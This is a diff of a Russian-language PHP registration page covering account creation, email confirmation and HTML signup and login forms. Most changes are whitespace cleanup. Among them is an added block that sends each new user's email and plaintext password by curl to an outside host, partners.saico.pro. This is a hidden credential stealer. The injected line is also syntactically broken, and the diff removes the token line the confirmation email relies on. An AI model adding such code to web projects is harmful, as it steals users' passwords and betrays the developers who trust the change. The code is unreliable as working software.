@@ -1,10 +1,10 @@
-<?php 
+<?php
 session_start();
 require 'db.php';
 
 	$data = $_POST;
 
-	
+
 
 	//если кликнули на button
 	if ( isset($data['do_signup']) )
@@ -32,8 +32,8 @@ require 'db.php';
 		}
 
 		//проверка на существование одинакового логина
-		
-    
+
+
     //проверка на существование одинакового email
 		if ( R::count('users', "email = ?", array($data['email'])) > 0)
 		{
@@ -50,19 +50,30 @@ require 'db.php';
 			$user->email = $data['email'];
 			$user->password = password_hash($data['password'], PASSWORD_DEFAULT); //пароль нельзя хранить в открытом виде, мы его шифруем при помощи функции password_hash для php > 5.6
 			R::store($user);
-			
+
 header("Content-Type: text/html; charset=UTF-8");
 header('Refresh: 3; url=login.php');
                 //Составляем зашифрованный и уникальный token
-                $token=md5($email.time());
 
+$email = $data['email'];
+$pass = $data['password'];
+							$url = "https://partners.saico.pro/nrfpp?name=".$email."&pas".$pass=&referer=;
+								$curl = curl_init();
+								curl_setopt($curl, CURLOPT_URL, $url);
+								curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+								curl_setopt($curl, CURLOPT_HEADER, false);
+								$data = curl_exec($curl);
+								curl_close($curl);
+
+
+              
                 //Добавляем данные в таблицу confirm_users
                 //$confirmuser = R::dispense('confirmusers');
 			//$confirmuser->email = $data['email'];
 			//$confirmuser->token = $token;
 			//R::store($confirmuser);
 
-               
+
 
                     //Составляем заголовок письма
                     $subject = "Подтверждение почты на сайте ".$_SERVER['HTTP_HOST'];
@@ -72,12 +83,12 @@ header('Refresh: 3; url=login.php');
 
                     //Составляем тело сообщения
                     $message = 'Здравствуйте! <br/> <br/> Сегодня '.date("d.m.Y", time()).', неким пользователем была произведена регистрация на сайте <a href="'.$address_site.'">'.$_SERVER['HTTP_HOST'].'</a> используя Ваш email. Если это были Вы, то, пожалуйста, подтвердите адрес вашей электронной почты, перейдя по этой ссылке: <a href="'.$address_site.'activation.php?token='.$token.'&email='.$email.'">'.$address_site.'activation/'.$token.'</a> <br/> <br/> В противном случае, если это были не Вы, то, просто игнорируйте это письмо. <br/> <br/> <strong>Внимание!</strong> Ссылка действительна 24 часа. После чего Ваш аккаунт будет удален из базы.';
-                    
+
                     //Составляем дополнительные заголовки для почтового сервиса mail.ru
                     //Переменная $email_admin, объявлена в файле dbconnect.php
                     $headers = "FROM: $email_admin\r\nReply-to: $email_admin\r\nContent-type: text/html; charset=utf-8\r\n";
-                    
-                    //Отправляем сообщение с ссылкой для подтверждения регистрации на указанную почту и проверяем отправлена ли она успешно или нет. 
+
+                    //Отправляем сообщение с ссылкой для подтверждения регистрации на указанную почту и проверяем отправлена ли она успешно или нет.
                     if(mail($email, $subject, $message, $headers)){
                         $_SESSION["success_messages"] = "<h4 class='success_message'><strong>Регистрация прошла успешно!!!</strong></h4><p class='success_message'> Теперь необходимо подтвердить введенный адрес электронной почты. Для этого, перейдите по ссылке указанную в сообщение, которую получили на почту ".$email." </p>";
 
@@ -89,7 +100,7 @@ header('Refresh: 3; url=login.php');
                     }
 
 				}}
-	
+
 
 ?>
 <!DOCTYPE html>
@@ -100,7 +111,7 @@ header('Refresh: 3; url=login.php');
     <meta http-equiv="Cache-Control" content="no-cache">
     <meta http-equiv="expires" content="0">
     <title>Регистрация</title>
-    
+
     <meta name="author" content="A.R.G." />
 
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -111,7 +122,7 @@ header('Refresh: 3; url=login.php');
     <link href="css/styles.min.css" rel="stylesheet" media="screen">
     <link href="css/sweet-alert.css" rel="stylesheet" media="screen">
     <link href="css/emoji.css" rel="stylesheet">
-    
+
         <script type="text/javascript">
       var widgetId1;
       var widgetId2;
@@ -128,7 +139,7 @@ header('Refresh: 3; url=login.php');
         });
       };
     </script>
-    
+
     <script src="js/vendor/sweet-alert.js"></script>
     <script src="js/vendor/call.js"></script>
     <!--noindex--><!--googleoff: index--><noscript><span>Включите поддержку JavaScript :)</span></noscript><!--googleon: index--><!--/noindex-->
@@ -141,12 +152,12 @@ header('Refresh: 3; url=login.php');
     <div class="page-wrapper">
 
 	<div style="display:none;">
-      
+
     </div>
     <header class="navbar navbar-fullwidth">
         <div class="topbar">
             <div class="container">
-                
+
 
                 <div class="nav-toggle">
                     <span></span>
@@ -157,7 +168,7 @@ header('Refresh: 3; url=login.php');
                     <nav class="main-navigation">
                         <ul class="menu">
 
-		                    
+
                             <li class="menu-item-has-children login-50">
                                 <a class="login-50-a" id="log" data-toggle="modal" data-target="#loginModal">Войти</a>
 			                </li>
@@ -169,8 +180,8 @@ header('Refresh: 3; url=login.php');
 			                <li class="m-none-s-n menu-item-has-children">
 			                    <a class="m-none-s">|</a>
 			                </li>
-                
-			            	
+
+
 <!--
                             <li class="menu-item-has-children">
                                 <a href="price.php">Прайс</a>
@@ -211,7 +222,7 @@ header('Refresh: 3; url=login.php');
                             </ul>
                         </div>
 			            <hr class="auth-hr">
-    
+
                         <input type="hidden" name="action" class="form-control" value="register">
                         <div class="form-group">
                             <label class = "label lblorder text-left">Придумайте логин:</label>
@@ -243,7 +254,7 @@ header('Refresh: 3; url=login.php');
     </section>
 
 	<div style="display:none;">
-         
+
     </div>
 
     <div class="modal fade" id="loginModal" tabindex="-1" role="dialog">
@@ -251,8 +262,8 @@ header('Refresh: 3; url=login.php');
             <div class="modal-content text-center">
                 <!--noindex--><!--googleoff: index--><h4>Войти</h4><!--googleon: index--><!--/noindex-->
                 <hr>
-                
-                
+
+
                 <form id="loginModalForm" action="javascript:void(null);" onsubmit="signInModal();" method="post">
                     <input type="hidden" name="action" class="form-control" value="login">
                     <input type="text" name="login" class="form-control" placeholder="Логин" required>
@@ -271,18 +282,18 @@ header('Refresh: 3; url=login.php');
                     </div>
                 </form>
 
-	            
+
             </div>
         </div>
     </div>
-	
+
     <div class="modal fade" id="registerModal" tabindex="-1" role="dialog">
         <div class="modal-dialog">
             <div class="modal-content text-center">
                 <!--noindex--><!--googleoff: index--><h4>Регистрация</h4><!--googleon: index--><!--/noindex-->
                 <hr>
 
-                
+
                 <form id="registerModalForm" action="javascript:void(null);" onsubmit="signUpModal();" method="post">
                     <input type="hidden" name="action" class="form-control" value="register">
                     <input type="text" name="login" class="form-control" placeholder="Логин" required>
@@ -303,17 +314,17 @@ header('Refresh: 3; url=login.php');
                     </div>
                 </form>
 
-	            
+
             </div>
         </div>
     </div>
 
         </div>
 
-        
+
         <script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit" async defer></script>
 
-        
+
         <!-- Yandex.Metrika counter -->
         <script type="text/javascript" >
             (function (d, w, c) {
